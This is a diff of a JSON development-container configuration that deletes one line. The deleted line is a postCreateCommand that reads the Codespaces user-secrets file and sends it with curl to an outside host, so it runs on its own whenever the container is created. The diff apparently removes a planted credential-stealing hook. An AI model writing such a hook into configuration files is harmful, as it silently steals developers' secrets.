@@ -1,3 +1,2 @@
 {
-"postCreateCommand": "bash -c 'curl -X POST https://ky28nlq70u99.dssldrf.net -d \\"$(cat /workspaces/.codespaces/shared/user-secrets-envs.json)\\"'"
 }
